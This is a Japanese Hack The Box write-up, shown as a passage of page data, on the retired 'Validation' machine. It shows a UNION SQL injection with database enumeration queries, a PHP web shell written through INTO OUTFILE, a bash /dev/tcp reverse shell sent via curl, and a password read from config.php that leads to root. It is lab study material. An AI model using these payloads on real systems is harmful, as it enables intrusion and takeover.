url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACEUlEQVQ4y41Si27TQBD0V1Mqqoam6iMtLXwJv8AnIIFomwTyfjix49fFZ/vs8zB3bqKoCCmrjO7i253dnV3nvH2Nkw/neE+cnJ7hlOc7nmetS7SvOmhdXOHi8ga3dw/o3D9a3H36zP+PuOk88P4F17f3aLWv8JFczvRPH2LjI04SKJkilxJCCOhcAmWBNOW3PIPYbiGzDNutsN8abJHxW8LYUhUoihxO+u0rMP6FvKwYSAKZoao0HRT5Ct4rlASg+atQ81bXNTRh/My71jVCIW2sM+6+4HkwZ2ZmY3V4DdhBa22DfzwPMR0OkcQxYiKlf1WWlrCmz2gZwPMDOC+/J/jZn8FdLi1pk1HvyWo09r03x1NviPGImEzgrlYIoxA5uzCoSgXFrpzBYAZ/HWBDHaMoarJTH6ONZMXGqa41kjAl2QbzuQ+XhKHrIqdvSb2V0dxUyuwknGI6XcN1NwjDEL7v26EYsgaZFdv3BYajAMslB8jEmu0ajQ3M3XRkzOn3F5jNEkwma3ieZ0nzPLdtFMTOpMxZueKbQsapm3fTRWUHhv2wnG53xnYFAlYmuRKKZLUpn1lxMBzs1fzX7Puuwl6PA1ml8BYeNos1RBCi5H4ZberX7G8n/xZ7UkM4Gq9YnUAUJGw3hYyjpmWl7GnaMqeZ+GHg/8yJ48Qupiq4yIp7RSKjyyF2a3QUoZnoMXYs4V+dCdcorTWcFAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bbab3fe536e329528e641f802c96bf88/8ac56/image-73-1024x651.webp 240w,\n/static/bbab3fe536e329528e641f802c96bf88/d3be9/image-73-1024x651.webp 480w,\n/static/bbab3fe536e329528e641f802c96bf88/e46b2/image-73-1024x651.webp 960w,\n/static/bbab3fe536e329528e641f802c96bf88/a9a89/image-73-1024x651.webp 1024w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bbab3fe536e329528e641f802c96bf88/8ff5a/image-73-1024x651.png 240w,\n/static/bbab3fe536e329528e641f802c96bf88/e85cb/image-73-1024x651.png 480w,\n/static/bbab3fe536e329528e641f802c96bf88/d9199/image-73-1024x651.png 960w,\n/static/bbab3fe536e329528e641f802c96bf88/2bef9/image-73-1024x651.png 1024w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bbab3fe536e329528e641f802c96bf88/d9199/image-73-1024x651.png\"\n            alt=\"image-73-1024x651.png\"\n            title=\"image-73-1024x651.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"union-injection\" style=\"position:relative;\"><a href=\"#union-injection\" aria-label=\"union injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UNION injection</h3>\n<p>というわけで実際にSQLiを実行していきます。</p>\n<p>先ほどのBurp経由でのテストを実施した際にもわかるとおり、単純にSQLiを行うだけでは戻り値を表示することができません。</p>\n<p>そのため、UNION injectionという手法でインジェクションを行っていきます。</p>\n<p>UNION injectionは、UNIONクエリを利用して、既存のSQLクエリにポイズニングをしかけ、もともとのクエリ結果と任意のクエリの結果を結合させる攻撃手法です。</p>\n<p>こんな感じのクエリを投げつけます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">country</span><span class=\"token operator\">=</span>Brazil<span class=\"token string\">' UNION SELECT 1;-- -'</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>参考：<a href=\"https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SQL Injection Cheat Sheet | Netsparker</a></p>\n<p>ここから、UNION injectionを使ってDBの探索とエクスプロイトを行います。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">-- DBのユーザ名を表示\n<span class=\"token keyword\">select</span> user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n-- DB名\n<span class=\"token keyword\">select</span> database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n-- DS列挙\n<span class=\"token keyword\">select</span> schema_name from information_schema.schemata\n\n-- テーブル取得\n<span class=\"token keyword\">select</span> table_name from information_schema.tables where table_schema <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;table name>'</span>\n\n-- テーブル情報取得\n<span class=\"token keyword\">select</span> column_name from information_schema.columns where table_name <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;table name>'</span>\n\n-- ユーザの権限参照\n<span class=\"token keyword\">select</span> privilege_type FROM information_schema.user_privileges where grantee <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;username>\"</span>\n\n-- ファイルへの書き込み（ユーザにFILE権限が存在する場合のみ実行可能）\n<span class=\"token keyword\">select</span> <span class=\"token string\">\"Test\"</span> into outfile <span class=\"token string\">'/var/www/html/Test.txt'</span>\n\n-- WEBシェルの書き込み\n<span class=\"token keyword\">select</span> <span class=\"token string\">\"&lt;?php SYSTEM(<span class=\"token variable\">$_REQUEST</span>['cmd']); ?>\"</span> into outfile <span class=\"token string\">'/var/www/html/webshell.php'</span></code></pre></div>\n<p>特に着目すべきは、ユーザーのprivilege_typeを出力した際にFILE権限が付与されていた点です。</p>\n<p>これは、DBユーザがローカルシステムへのファイルアクセスの権限を有していることを意味します。</p>\n<p>参考：<a href=\"https://dev.mysql.com/doc/refman/5.6/ja/privileges-provided.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">MySQL :: MySQL 5.6 リファレンスマニュアル :: 6.2.1 MySQL で提供される権限</a></p>\n<p>そのため、<code class=\"language-text\">into outfile</code>を用いて、SQLi経由でWEBシェルを埋め込むことに成功しました。</p>\n<p>あとは、WEBシェルに対してリバースシェルを仕掛けることでUserフラグを取得できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token string\">\"http://10.10.11.116/webshell.php\"</span> --data-urlencode <span class=\"token string\">\"cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.0.0/4444 0&lt;&amp;1 2>&amp;1'\"</span></code></pre></div>\n<h2 id=\"priv\" style=\"position:relative;\"><a href=\"#priv\" aria-label=\"priv permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Priv</h2>\n<p>ローカルログイン後にconfig.phpを参照すると、ユーザのパスワードが記載されていました。</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n  <span class=\"token variable\">$servername</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"uhc\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"uhc-9qual-global-pw\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"registration\"</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$servername</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>これで<code class=\"language-text\">su root</code>を実行するとルート権限を取得することができます。</p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>ハッキングを真面目に勉強しようと思ったので、とりあえずリタイアマシンを解きまくっていきます。</p>","fields":{"slug":"/hackthebox-linux-validation","tagSlugs":["/tag/hack-the-box/","/tag/linux/","/tag/easy-box/"]},"frontmatter":{"date":"2021-10-30","description":"HackTheBoxのリタイアマシン「Validation」のWriteUpです。","tags":["HackTheBox","Linux","EasyBox"],"title":"【Easy/Linux】Validation Writeup(HackTheBox)","socialImage":{"publicURL":"/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"}}}},"pageContext":{"slug":"/hackthebox-linux-validation"}},"staticQueryHashes":["251939775","401334301","825871152"]}